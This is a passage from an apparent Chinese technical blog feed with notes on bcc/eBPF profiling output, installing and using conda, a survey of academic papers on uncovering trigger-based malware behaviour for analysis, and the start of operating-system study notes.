class="markdownIt-Anchor" href="#110-runqlat"></a> 1.10. runqlat</h3><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap"><span class="hljs-comment"># ./runqlat</span><br>Tracing run queue latency... Hit Ctrl-C to end.<br>^C<br>     usecs               : count     distribution<br>        <span class="hljs-number"> 0 </span>-&gt;<span class="hljs-number"> 1 </span>         :<span class="hljs-number"> 233 </span>     |***********                             |<br>        <span class="hljs-number"> 2 </span>-&gt;<span class="hljs-number"> 3 </span>         :<span class="hljs-number"> 742 </span>     |************************************    |<br>        <span class="hljs-number"> 4 </span>-&gt;<span class="hljs-number"> 7 </span>         :<span class="hljs-number"> 203 </span>     |**********                              |<br>        <span class="hljs-number"> 8 </span>-&gt;<span class="hljs-number"> 15 </span>        :<span class="hljs-number"> 173 </span>     |********                                |<br>       <span class="hljs-number"> 16 </span>-&gt;<span class="hljs-number"> 31 </span>        :<span class="hljs-number"> 24 </span>      |*                                       |<br>       <span class="hljs-number"> 32 </span>-&gt;<span class="hljs-number"> 63 </span>        :<span class="hljs-number"> 0 </span>       |                                        |<br>       <span class="hljs-number"> 64 </span>-&gt;<span class="hljs-number"> 127 </span>       :<span class="hljs-number"> 30 </span>      |*                                       |<br>      <span class="hljs-number"> 128 </span>-&gt;<span class="hljs-number"> 255 </span>       :<span class="hljs-number"> 6 </span>       |                                        |<br>      <span class="hljs-number"> 256 </span>-&gt;<span class="hljs-number"> 511 </span>       :<span class="hljs-number"> 3 </span>       |                                        |<br>      <span class="hljs-number"> 512 </span>-&gt;<span class="hljs-number"> 1023 </span>      :<span class="hljs-number"> 5 </span>       |                                        |<br>     <span class="hljs-number"> 1024 </span>-&gt;<span class="hljs-number"> 2047 </span>      :<span class="hljs-number"> 27 </span>      |*                                       |<br>     <span class="hljs-number"> 2048 </span>-&gt;<span class="hljs-number"> 4095 </span>      :<span class="hljs-number"> 30 </span>      |*                                       |<br>     <span class="hljs-number"> 4096 </span>-&gt;<span class="hljs-number"> 8191 </span>      :<span class="hljs-number"> 20 </span>      |                                        |<br>     <span class="hljs-number"> 8192 </span>-&gt;<span class="hljs-number"> 16383 </span>     :<span class="hljs-number"> 29 </span>      |*                                       |<br>    <span class="hljs-number"> 16384 </span>-&gt;<span class="hljs-number"> 32767 </span>     :<span class="hljs-number"> 809 </span>     |****************************************|<br>    <span class="hljs-number"> 32768 </span>-&gt;<span class="hljs-number"> 65535 </span>     :<span class="hljs-number"> 64 </span>      |***                                     |<br></code></pre></div></td></tr></table></figure><p>runqlat 计算线程在 CPU 运行队列上等待的时间，并将其打印为直方图。</p><p>这可以帮助量化在 CPU 饱和期间等待开启 CPU 所损失的时间。</p><h3 id="111-profile"><a class="markdownIt-Anchor" href="#111-profile"></a> 1.11. profile</h3><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"># ./<span class="hljs-selector-tag">profile</span><br><span class="hljs-selector-tag">Sampling</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">49</span> <span class="hljs-selector-tag">Hertz</span> <span class="hljs-selector-tag">of</span> <span class="hljs-keyword">all</span> <span class="hljs-selector-tag">threads</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">user</span> + <span class="hljs-selector-tag">kernel</span> <span class="hljs-selector-tag">stack</span>... <span class="hljs-selector-tag">Hit</span> <span class="hljs-selector-tag">Ctrl-C</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">end</span>.<br>^<span class="hljs-selector-tag">C</span><br>    <span class="hljs-selector-tag">00007f31d76c3251</span> <span class="hljs-selector-attr">[unknown]</span><br>    <span class="hljs-selector-tag">47a2c1e752bf47f7</span> <span class="hljs-selector-attr">[unknown]</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">sign-file</span> (<span class="hljs-number">8877</span>)<br>        <span class="hljs-selector-tag">1</span><br><br>    <span class="hljs-selector-tag">ffffffff813d0af8</span> <span class="hljs-selector-tag">__clear_user</span><br>    <span class="hljs-selector-tag">ffffffff813d5277</span> <span class="hljs-selector-tag">iov_iter_zero</span><br>    <span class="hljs-selector-tag">ffffffff814ec5f2</span> <span class="hljs-selector-tag">read_iter_zero</span><br>    <span class="hljs-selector-tag">ffffffff8120be9d</span> <span class="hljs-selector-tag">__vfs_read</span><br>    <span class="hljs-selector-tag">ffffffff8120c385</span> <span class="hljs-selector-tag">vfs_read</span><br>    <span class="hljs-selector-tag">ffffffff8120d786</span> <span class="hljs-selector-tag">sys_read</span><br>    <span class="hljs-selector-tag">ffffffff817cc076</span> <span class="hljs-selector-tag">entry_SYSCALL_64_fastpath</span><br>    <span class="hljs-selector-tag">00007fc5652ad9b0</span> <span class="hljs-selector-tag">read</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">dd</span> (<span class="hljs-number">25036</span>)<br>        <span class="hljs-selector-tag">4</span><br><br>    <span class="hljs-selector-tag">0000000000400542</span> <span class="hljs-selector-tag">func_a</span><br>    <span class="hljs-selector-tag">0000000000400598</span> <span class="hljs-selector-tag">main</span><br>    <span class="hljs-selector-tag">00007f12a133e830</span> <span class="hljs-selector-tag">__libc_start_main</span><br>    <span class="hljs-selector-tag">083e258d4c544155</span> <span class="hljs-selector-attr">[unknown]</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">func_ab</span> (<span class="hljs-number">13549</span>)<br>        <span class="hljs-selector-tag">5</span><br><br><span class="hljs-selector-attr">[...]</span><br><br>    <span class="hljs-selector-tag">ffffffff8105eb66</span> <span class="hljs-selector-tag">native_safe_halt</span><br>    <span class="hljs-selector-tag">ffffffff8103659e</span> <span class="hljs-selector-tag">default_idle</span><br>    <span class="hljs-selector-tag">ffffffff81036d1f</span> <span class="hljs-selector-tag">arch_cpu_idle</span><br>    <span class="hljs-selector-tag">ffffffff810bba5a</span> <span class="hljs-selector-tag">default_idle_call</span><br>    <span class="hljs-selector-tag">ffffffff810bbd07</span> <span class="hljs-selector-tag">cpu_startup_entry</span><br>    <span class="hljs-selector-tag">ffffffff8104df55</span> <span class="hljs-selector-tag">start_secondary</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">swapper</span>/<span class="hljs-selector-tag">1</span> (<span class="hljs-number">0</span>)<br>        <span class="hljs-selector-tag">75</span><br></code></pre></div></td></tr></table></figure><p>profile 是一个 CPU 分析器，它以定时间隔对堆栈跟踪进行采样，并打印唯一堆栈跟踪的摘要及其出现次数。</p><p>使用此工具可了解消耗 CPU 资源的代码路径。</p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Install and Configue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eBPF</tag>
      
      <tag>bcc</tag>
      
      <tag>install</tag>
      
      <tag>configue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>conda安装使用</title>
    <link href="/posts/e053e15d/"/>
    <url>/posts/e053e15d/</url>
    
    <content type="html"><![CDATA[<h1 id="conda安装使用"><a class="markdownIt-Anchor" href="#conda安装使用"></a> conda安装使用</h1><h2 id="linux下conda安装"><a class="markdownIt-Anchor" href="#linux下conda安装"></a> linux下conda安装</h2><ul><li><p>在官网<a href="https://conda.io/en/latest/miniconda.html">miniconda</a>下载文件</p></li><li><p>执行bash脚本：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># 文件名可能会更改</span><br><span class="hljs-attribute">sh</span> Miniconda<span class="hljs-number">3</span>-py<span class="hljs-number">38</span>_<span class="hljs-number">4</span>.<span class="hljs-number">10</span>.<span class="hljs-number">3</span>-Linux-x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>.sh -b<br></code></pre></div></td></tr></table></figure></li><li><p>接下来，初始化终端Shell，以便我们可以直接运行<code>conda</code>。</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">~<span class="hljs-regexp">/miniconda3/</span>bin/conda init<br></code></pre></div></td></tr></table></figure><p>如果默认shell不是bash,比如是zsh可以执行下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">conda init zsh<br></code></pre></div></td></tr></table></figure><p>这会自己更新zsh的配置文件~/.zshrc</p></li><li><p>现在关闭并重新打开当前的shell。你应该能用下面的命令创建一个新的环境：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">conda</span> create --name d<span class="hljs-number">2</span>l python=<span class="hljs-number">3</span>.<span class="hljs-number">8</span> -y<br></code></pre></div></td></tr></table></figure><p>现在激活 <code>d2l</code> 环境：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">conda</span> activate d<span class="hljs-number">2</span>l<br></code></pre></div></td></tr></table></figure><blockquote><p>有个问题，这样之后conda会在每次终端打开都默认开启base虚拟环境，如果不想要默认开这个环境，可以输入下面的命令</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">conda<span class="hljs-built_in"> config </span>--<span class="hljs-builtin-name">set</span> auto_activate_base <span class="hljs-literal">false</span><br></code></pre></div></td></tr></table></figure><p>在最新的anaconda安装后将其加入到bashrc中后，会默认自动激活基础环境，上面的命令就是将其自动激活的true更改为false，即可关闭虚拟环境，以后需要使用直接用命令行即可。</p><figure class="highlight vala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vala"><span class="hljs-meta">#开启</span><br>conda activate spacename<span class="hljs-comment">//环境的名称</span><br><span class="hljs-meta">#关闭</span><br>conda deactivate spacename<br><span class="hljs-meta">#列出当前环境安装的包</span><br>conda list<br><span class="hljs-meta">#列出当前所有环境</span><br>conda env list<br><span class="hljs-meta">#安装包</span><br>conda install XX<br><span class="hljs-meta">#使用pip会安装在系统python环境下</span><br></code></pre></div></td></tr></table></figure></blockquote></li></ul><h2 id="windows下conda安装和pycharm环境配置"><a class="markdownIt-Anchor" href="#windows下conda安装和pycharm环境配置"></a> windows下conda安装和pycharm环境配置</h2><p>可以参考这两篇</p><p><a href="https://www.cnblogs.com/lxy764139720/p/15068466.html">Windows配置深度学习环境详细教程（一）：安装Pycharm和Miniconda</a></p><p><a href="https://www.cnblogs.com/lxy764139720/p/15068534.html">Windows配置深度学习环境详细教程（二）：conda工具的使用</a></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Install and Configue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>conda</tag>
      
      <tag>install</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：软件恶意行为激活相关论文调研</title>
    <link href="/posts/e556431a/"/>
    <url>/posts/e556431a/</url>
    
    <content type="html"><![CDATA[<h1 id="恶意行为激活论文调研"><a class="markdownIt-Anchor" href="#恶意行为激活论文调研"></a> 恶意行为激活论文调研</h1><h2 id="1多路径探索"><a class="markdownIt-Anchor" href="#1多路径探索"></a> 1.多路径探索</h2><h4 id="论文信息"><a class="markdownIt-Anchor" href="#论文信息"></a> <strong>论文信息</strong></h4><p>论文名称:<a href="https://sites.cs.ucsb.edu/~chris/research/doc/oakland07_explore.pdf">Exploring Multiple Execution Paths for Malware Analysis</a></p><p>时间出处:2007 IEEE</p><h4 id="论文概述"><a class="markdownIt-Anchor" href="#论文概述"></a> <strong>论文概述</strong></h4><p>首先为程序<strong>标记了某些感兴趣的输入</strong>，并在执行期间动态地跟踪它们的传播（<strong>污点分析</strong>）。我们的系统监视这些输入值被过程移动和操作的方式。每当我们检测到基于标记值的控制流决策时，就会<strong>存储进程地址空间的当前内容</strong>。然后，执行正常进行。当进程以后希望终止时，会自动将其<strong>重置为以前存储的快照</strong>。这是通过将进程地址空间的当前内容替换为以前存储的值来实现的。此外，我们重写了在控制流决策中使用的输入值，这样这个决策的结果就会颠倒过来。然后，流程沿着另一个分支继续执行。当然，一行中可能会遇到多个分支。在这种情况下，执行空间是通过按<strong>深度优先</strong>顺序选择延续点来探索的。</p><p>当重写某个输入值以探索另一个exe执行路径时，通常仅改变控制流决策使用的单个内存位置是不够的。相反，必须一致地更新(或重写)进程地址空间中与输入相关的所有值。原因是原始的输入值可能已经被复制到其他内存位置，甚至被程序用作以前一些计算的一部分。当只有一个输入实例被修改时，原始值的副本可能会保留在程序的数据段中。这可能导致执行无效操作或探索不可能的路径。因此，为了能够一致地更新和输入及其相关的值，有必要<strong>跟踪哪些内存位置依赖于某个输入以及它们如何依赖于这个值</strong>。</p><h4 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> <strong>问题</strong></h4><p>存在执行路径爆炸和回滚开销大的问题</p><h2 id="2特定领域的多路径探索优化"><a class="markdownIt-Anchor" href="#2特定领域的多路径探索优化"></a> 2.特定领域的多路径探索优化</h2><h4 id="论文信息-2"><a class="markdownIt-Anchor" href="#论文信息-2"></a> 论文信息</h4><p>论文名称:<a href="https://talosintelligence.com/resources/12">RAMBO: Run-time packer Analysis with Multiple Branch Observation</a></p><p>时间出处:DIMVA 2016</p><h4 id="论文介绍"><a class="markdownIt-Anchor" href="#论文介绍"></a> 论文介绍</h4><p>运行时打包是恶意软件作者为了隐藏(例如，加密)恶意代码并在运行时恢复它而使用的一种技术。特别是，一些运行时包装器只<strong>在需要时解密个别区域的代码，并在它们不运行时重新加密它们</strong>。这种技术被称为移动解码帧，它可以极大地复杂化恶意软件分析。</p><p>分析这些示例时想到的第一个解决方案是应用<strong>多路径探索来触发所有代码区域的解包</strong>。不幸的是，众所周知，多路径探索有几个局限性，比如它在分析现实世界的二进制文件时的可伸缩性有限。</p><p>在本文中，作者提出了一套<strong>特定领域(程序解包领域）的优化和启发式方法来指导多路径探索</strong>，并提高其效率和可靠性，以解包的二进制保护移动解码帧。</p><h4 id="方法概述"><a class="markdownIt-Anchor" href="#方法概述"></a> 方法概述</h4><p>优化和启发式方法的引导目的都是将程序执行引导向未解包区域</p><p>优化主要是对符号执行的优化</p><p>启发式方法通过提高可以到达未解包区域路径的优先级来引导多路径探索</p><h2 id="3并行环境空间下的推测执行"><a class="markdownIt-Anchor" href="#3并行环境空间下的推测执行"></a> 3.并行环境空间下的推测执行</h2><h4 id="论文信息-3"><a class="markdownIt-Anchor" href="#论文信息-3"></a> 论文信息</h4><p>论文名称:<a href="http://faculty.cs.tamu.edu/guofei/paper/GoldenEye-RAID14.pdf">GOLDENEYE: Efficiently and Effectively Unveiling Malware’s Targeted Environment</a></p><p>时间出处:RAID 2014</p><h4 id="论文介绍-2"><a class="markdownIt-Anchor" href="#论文介绍-2"></a> 论文介绍</h4><p>其<strong>关键思想</strong>是，通过在单个恶意软件执行过程中<strong>提供几个动态的、并行的虚拟环境空间</strong>，GOLDENEYE通过一个特殊设计的<strong>投机执行引擎</strong>来观察恶意软件在不同环境下的行为，主动确定恶意软件的目标环境。此外，GOLDENEYE动态地、自适应地切换分析环境，让恶意软件自己暴露其依赖于目标环境的行为。虽然GOLDENEYE<strong>用空间来换取速度</strong>，但有趣的是，我们的实验结果表明，GOLDENEYE实际上可以使用更少的内存空间，同时实现<strong>比现有的多路径探测技术更高的速度</strong>。</p><p><img src="/posts/e556431a/image-20220213153130804-16447641099341.png" alt="image-20220213153130804"></p><h4 id="方法概述-2"><a class="markdownIt-Anchor" href="#方法概述-2"></a> 方法概述</h4><p><strong>关键设计1</strong>——动态构建并行空间来揭露恶意行为</p><p>为了克服预先静态指定多个分析环境的局限性，我们的设计是根据恶意软件的行为动态构造多个环境，调用环境查询api。特别是，通过预先标记这些api，我们可以理解每个环境查询的所有可能的返回值。对于每个可能的返回值，我们为其构造一个环境。</p><p>例如，如果我们发现恶意软件查询系统调用GetKeyboardLayout，我们可以准备多个返回值，例如中文的0x0004，美国的0x0409，并模拟两个具有中英文键盘的并行运行环境来分析恶意软件的行为。如图2所示，并行环境是与恶意软件的执行一起构建的，因此，它可以防止多次运行相同的样本。只要我们的API标注(第4节介绍)能够涵盖环境查询，我们相信GOLDENEYE能够自动检测/暴露样品的所有环境敏感行为。</p><p><strong>关键设计2</strong>——在并行环境中应用投机执行</p><p>我们应用投机执行[31]的概念,是指当计算机系统执行一些不一定需要的任务在我们的上下文中应用投机执行的优点是尽可能地让执行向前进行。因此，我们考虑在线构建多个可能的环境，并在每个环境实例中推测执行恶意软件。通过确定最可能的恶意执行路径，我们还可以确定为了到达某个路径，运行的环境是什么。</p><p>首先，由于在每个环境中执行的指令是不同的，实际上以在线动态方式预测执行是不可行的。我们通过在基本块级别上逐步执行投机执行来解决这个挑战。特别是，我们在所有可选环境设置中执行每个基本块。由于在每个基本块中没有分支指令，所有环境中的指令都是相同的。当我们到达一个块末尾的分支指令时，我们应用几个<strong>启发式方法</strong>来确定哪个是可能的恶意路径。因此，我们<strong>通过只保留最可能通向期望路径的设置来减少空间</strong>。</p><p>其次，投机执行本质上是速度和空间之间的一种权衡方案(即用更多的内存消耗来换取加速)[31]。在我们的设计中，我们还试图通过两种新颖的设计来减少内存消耗:</p><ul><li>(1) 我们只<strong>推测执行在不同环境下产生不同结果的指令</strong>。我们选择采用污染分析，以缩小范围，以操作环境相关数据的说明。</li><li>(2) 我们<strong>监控内存的使用</strong>，以防止可选环境的爆炸。</li></ul><h4 id="主要步骤"><a class="markdownIt-Anchor" href="#主要步骤"></a> 主要步骤</h4><p>我们在代码块的粒度上进行投机执行，以模拟恶意软件在多个并行环境空间中的执行。</p><blockquote><p>我们首先预取一个指令块。接下来，我们对预取的指令应用污染分析，并将API/指令输出(环境元素)的每个字节污染为污染源。使用污染分析的原因是过滤那些与环境无关的指令，这可以减少完全投机执行的开销。我们传播被污染的标签，当我们使用被污染的操作数命中一条指令时，我们相应地更新所有可选环境中的执行上下文。我们继续这样的传播，直到我们到达块的末尾，这是一个分支指令。对于分支指令，我们确定它是否会受到受污染字节的影响。如果它是一个环境敏感的分支，我们继续下一步，即分支选择和更新。如果不是，投机执行将开始一个新的预取操作。</p><p>如果我们知道哪个分支更有可能是恶意软件作者想要的分支，我们可以动态调整环境，让恶意软件只执行一些指定的分支。原则上，当我们发现一个分支属于一个可能的恶意路径时，我们将重新检查可选的环境，并且只选择可以用于执行所需分支的环境。</p></blockquote><p><img src="/posts/e556431a/image-20220213172922827.png" alt="image-20220213172922827"></p><h4 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h4><ul><li><p>程序不断向前执行，没有回滚开销，不需要为每个分支存储快照</p></li><li><p>使用污染分析跳过许多对环境不敏感的分支，不需要探索全部路径</p></li><li><p>监控内存的使用，以防止可选环境的爆炸。</p></li></ul><h2 id="4定向符号执行"><a class="markdownIt-Anchor" href="#4定向符号执行"></a> 4.定向符号执行</h2><h4 id="论文信息-4"><a class="markdownIt-Anchor" href="#论文信息-4"></a> 论文信息</h4><p>论文名称:<a href="https://www.crysys.hu/~dpapp/publications/files/PappTB2019sefm.pdf">Towards Detecting Trigger-based Behavior In Binaries: Uncovering the Correct Environment</a></p><p>时间出处:SEFM 2019</p><h4 id="论文介绍-3"><a class="markdownIt-Anchor" href="#论文介绍-3"></a> 论文介绍</h4><p>如果一个程序包含无文档记录的、通常是恶意的、仅在特定情况下执行的功能，那么它就会显示出<strong>基于触发器的行为</strong>。作者使用了<strong>定向符号执行</strong>来触发这种行为所需的输入和环境。</p><p>具体来说，我们提出了<strong>克服环境问题和路径选择问题的技术</strong>。我们实现了我们的技术，并在一个真正的恶意软件样本上评估了它们的性能，该样本在收到特定的远程命令后会发起拒绝服务攻击。得益于我们的技术，我们的实现能够确定在合理时间内<strong>触发恶意行为所需的那些特定命令和所有其他需求</strong>。</p><h4 id="方法概述-3"><a class="markdownIt-Anchor" href="#方法概述-3"></a> 方法概述</h4><p>侧重于如何<strong>计算正确的环境条件，以便被分析的恶意软件可以触发特定的行为</strong>。我们假设人类分析人员有一个特定的程序点，并希望发现触发其执行所需的输入。为此，我们采用了两种技术:</p><p>1)符号摘要函数捕获被调用的系统调用的行为，以便将环境数据模型引入到分析中;</p><p>2)最短距离符号执行，这是一种路径选择策略，用于引导分析走向所选的程序点。</p><ul><li>实现了一个<strong>启发式算法来丢弃包含在最短路径计算中可能导致不正确路径的边</strong>。</li></ul><h2 id="5识别行为调度程序"><a class="markdownIt-Anchor" href="#5识别行为调度程序"></a> 5.识别行为调度程序</h2><h4 id="论文信息-5"><a class="markdownIt-Anchor" href="#论文信息-5"></a> 论文信息</h4><p>论文名称:<a href="https://huhong789.github.io/papers/park:bdhunter.pdf">Identifying Behavior Dispatchers for Malware Analysis</a></p><p>时间出处:ASIA CSS 2021</p><h4 id="论文介绍-4"><a class="markdownIt-Anchor" href="#论文介绍-4"></a> 论文介绍</h4><p>介绍了一个BDHunter系统，它可以有效地识别基于触发器的恶意软件中的行为分配器。我们证明了在恶意软件分析系统中引导程序执行到行为调度程序可以帮助揭示基于触发器的恶意行为。</p><p>我们将<strong>行为分配器</strong>概括为一种常见的控制流模式，可以通过控制流图(CFG)上的模式匹配来识别:</p><ol><li>它包含一组由分支条件定义的条件分支操作;</li><li>一旦条件满足，它就会引导程序执行恶意操作;</li><li>如果匹配失败，它会继续进行下一次检查</li></ol><h4 id="方法概述-4"><a class="markdownIt-Anchor" href="#方法概述-4"></a> 方法概述</h4><p><img src="/posts/e556431a/image-20220213221043513.png" alt="image-20220213221043513"></p><p>识别行为分配器的第一步是从恶意软件样本中收集初步信息，包括从<strong>动态执行中调用的API调用</strong>和<strong>从静态分析中获取的控制流图</strong>。</p><p>然后BDHunter使用两种算法来检测行为分配器:</p><ul><li><p><strong>一种基于控制流模式匹配</strong>（静态分析）</p><p>基于模式的方法在恶意软件二进制文件中<strong>进行静态搜索</strong>，以识别<strong>具有调度程序模式的基本块</strong>:一个行为调度程序包含一组CondBrOps(条件分支操作），每个CondBrOps将CommVar（公共常量）与一个触发值进行比较。</p></li><li><p><strong>另一种基于加权API调用</strong>（动态分析）</p><p>在基于权重的方法中，BDHunter根据每个API调用构造恶意操作的重要性为其分配一个初始权重，并将这些权重聚合到这些API调用的调用方。如果在动态执行恶意软件样本时可以收集可疑的API调用，BDHunter将利用这两种方法生成一组候选行为调度程序</p><p>BDHunter在<strong>动态执行期间收集被调用的API调用</strong>，用于其基于权重的标识符。它使用这些调用来帮助识别行为分配器，从而在基于模式的方法之上提高效率和准确性。</p><p>基于权重的方法主要用于<strong>增强</strong>基于模式的方法。否则，BDHunter使用基于模式的方法生成一组候选行为调度程序。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Paper Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文笔记</tag>
      
      <tag>恶意行为激活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统学习笔记</title>
    <link href="/posts/8ce3e425/"/>
    <url>/posts/8ce3e425/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-导论"><a class="markdownIt-Anchor" href="#第1章-导论"></a> 第1章 导论</h1><h2 id="11-操作系统做什么"><a class="markdownIt-Anchor" href="#11-操作系统做什么"></a> 1.1 操作系统做什么</h2><p>计算机系统可以大致分为4个组成部分：计算机硬件、操作系统、系统程序与应用程序和用户。</p><p><img src="/posts/8ce3e425/image-20211114101353468.png" alt="image-20211114101353468"></p><p><strong>定义操作系统</strong>：</p><p>操作系统是一直运行在计算机上的程序（通常称为内核），其他程序则为系统程序和应用程序。</p><h2 id="12-计算机系统组织"><a class="markdownIt-Anchor" href="#12-计算机系统组织"></a> 1.2 计算机系统组织</h2><p><strong>1.2.1 计算机系统操作</strong></p><p><strong>1.2.2 存储结构</strong></p><p><img src="/posts/8ce3e425/image-20211114104118324.png" alt="image-20211114104118324"></p><p><strong>1.2.3 I/O结构</strong></p><h2 id="13-计算机系统体系结构"><a class="markdownIt-Anchor" href="#13-计算机系统体系结构"></a> 1.3 计算机系统体系结构</h2><p><strong>1.3.1 单处理器系统</strong></p><p><strong>1.3.2 多处理器系统</strong></p><p><strong>1.3.3 集群系统</strong></p><p>与多处理器系统一样， 集群系统将多个CPU集中起来完成计算任务。然而，集群系统与多处理器系统不同，它是由两个或多个独立的系统藕合起来的。</p><h2 id="14-操作系统结构"><a class="markdownIt-Anchor" href="#14-操作系统结构"></a> 1.4 操作系统结构</h2><h2 id="15-操作系统操作"><a class="markdownIt-Anchor" href="#15-操作系统操作"></a> 1.5 操作系统操作</h2><p>1.5.1 双重模式操作<br>1.5.2 定时器</p><h2 id="16-进程管理"><a class="markdownIt-Anchor" href="#16-进程管理"></a> 1.6 进程管理</h2><h2 id="17-内存管理"><a class="markdownIt-Anchor" href="#17-内存管理"></a> 1.7 内存管理</h2><h2 id="18-存储管理"><a class="markdownIt-Anchor" href="#18-存储管理"></a> 1.8 存储管理</h2><p>1.8.1 文件系统管理<br>1.8.2 大容量存储器管理<br>1.8.3 高速缓存<br>1.8.4 V/O系统</p><h2 id="19-保护和安全"><a class="markdownIt-Anchor" href="#19-保护和安全"></a> 1.9 保护和安全</h2><h2 id="110-分布式系统"><a class="markdownIt-Anchor" href="#110-分布式系统"></a> 1.10 分布式系统</h2><h2 id="111-专用系统"><a class="markdownIt-Anchor" href="#111-专用系统"></a> 1.11 专用系统</h2><p>1.111 实时嵌入式系统<br>1.11.2 多媒体系统<br>1.11.3 手持系统</p><h2 id="112-计算环境"><a class="markdownIt-Anchor" href="#112-计算环境"></a> 1.12 计算环境</h2><p>1.12.1 传统计算<br>1.12.2 客户机服务器计算<br>1.12.3 对等计算<br>1.12.4 基于Web的计算</p><p><strong>用户态切换到内核态的3种方式</strong></p><ol><li><p><strong>系统调用</strong> 这是用户态进程主动要求切换到内核态的一种方式，用户态进程通过系统调用申请使用操作系统提供的服务程序完成工作。而系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现，例如Linux的int 80h中断。</p></li><li><p><strong>异常</strong> 当CPU在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</p></li><li><p><strong>外围设备的中断</strong> 当外围设备完成用户请求的操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</p></li></ol><h1 id="第2章-操作系统结构"><a class="markdownIt-Anchor" href="#第2章-操作系统结构"></a> 第2章 操作系统结构</h1><h2 id="21-操作系统服务"><a class="markdownIt-Anchor" href="#21-操作系统服务"></a> 2.1 操作系统服务</h2><ul><li><p><strong>用户界面</strong>：</p><ul><li>一种是命令行界面（command-line interface CLI）， 它采用文本命令， 并用一定的方法输入（即一种允许输入并编辑的命令〉。</li><li>另一种是批界面， 其中控制这些命令和命令的指令被输入文件中，通过执行文件来实现。</li><li>最为常用的是图形用户界面（graphical user interface,GUI)， 此时界面是一个视窗系统， 它具有定位设备来指挥I/O、从菜单来选择、选中部分并用键盘输入文本。有些系统还提供了两种甚至所有这三种界面。</li></ul></li><li><p><strong>程序执行</strong>： 系统必须能将程序装入内存并运行程序。程序必须能结束执行， 包括正常或不正常结束（指明错误）。</p></li><li><p><strong>I/O操作</strong>：运行程序可能需要I/O，这些I/O 